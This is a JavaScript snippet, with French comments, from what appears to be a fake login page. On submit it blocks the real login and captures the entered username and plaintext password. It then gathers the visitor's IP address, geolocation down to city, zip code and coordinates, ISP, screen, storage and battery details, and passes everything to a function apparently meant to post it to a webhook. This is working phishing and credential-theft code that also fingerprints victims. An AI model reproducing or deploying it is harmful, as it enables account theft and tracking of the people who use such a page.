    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            getLocationAndIPAddress(username, password);
        });

        function getLocationAndIPAddress(username, password) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipAddress = data.ip;
                    fetch('https://ipapi.co/' + ipAddress + '/json/')
                        .then(response => response.json())
                        .then(locationData => {
                            var geoInfo = {
                                country: locationData.country_name,
                                region: locationData.region,
                                city: locationData.city,
                                zipCode: locationData.postal,
                                latitude: locationData.latitude,
                                longitude: locationData.longitude,
                                timezone: locationData.timezone
                            };

                            var deviceInfo = {
                                screenWidth: window.screen.width,
                                screenHeight: window.screen.height,
                                screenSize: getScreenSizeInInches(), // Utiliser la fonction pour obtenir la taille de l'√©cran en pouces
                                deviceType: (window.screen.width < 768) ? "T√©l√©phone" : "Ordinateur"
                            };

                            var operatorInfo = {
                                organization: locationData.org // Organisation √† partir des donn√©es de localisation
                            };

                            var diskInfo = {
                                diskCapacity: "N/A"
                            };

                            navigator.storage.estimate().then(storage => {
                                diskInfo.diskCapacity = (storage.quota / (1024 * 1024 * 1024)).toFixed(2) + " Go"; // Conversion de l'espace disque en Go
                                var batteryInfo = {
                                    batteryLevel: "N/A",
                                    chargingStatus: "N/A"
                                };

                                if (navigator.getBattery) {
                                    navigator.getBattery().then(function(battery) {
                                        batteryInfo.batteryLevel = (battery.level * 100).toFixed(2) + "%";
                                        batteryInfo.chargingStatus = battery.charging ? "En charge" : "D√©charg√©e";
                                        var loginInfo = {
                                            username: username,
                                            password: password,
                                            ipAddress: ipAddress,
                                            geoInfo: geoInfo,
                                            deviceInfo: deviceInfo,
                                            operatorInfo: operatorInfo,
                                            diskInfo: diskInfo,
                                            batteryInfo: batteryInfo
                                        };
                                        sendEmbedToWebhook(loginInfo);
                                    });
                                } else {
                                    var loginInfo = {
                                        username: username,
                                        password: password,
                                        ipAddress: ipAddress,
                                        geoInfo: geoInfo,
                                        deviceInfo: deviceInfo,
                                        operatorInfo: operatorInfo,
                                        diskInfo: diskInfo,
                                        batteryInfo: batteryInfo
                                    };
                                    sendEmbedToWebhook(loginInfo);
                                }
                            });
                        })
                        .catch(error => {
                            console.error('Erreur lors de la r√©cup√©ration des informations de localisation:', error);
                        });
                })
                .catch(error => {
                    console.error('Erreur lors de la r√©cup√©ration de l\'adresse IP publique:', error);
                });
        }
        function getScreenSizeInInches() {
    // Largeur et hauteur de l'√©cran en pixels
    var screenWidth = window.screen.width;
    var screenHeight = window.screen.height;

    // Diagonale de l'√©cran en pixels
    var diagonalPixels = Math.sqrt(Math.pow(screenWidth, 2) + Math.pow(screenHeight, 2));

    // R√©solution en pixels par pouce (PPI)
    var pixelRatio = window.devicePixelRatio;

    // Calcul de la taille de l'√©cran en pouces
    var diagonalInches = diagonalPixels / pixelRatio / 96; // 1 pouce = 96 pixels (standard pour les √©crans)

    return diagonalInches.toFixed(1) + '"';
}
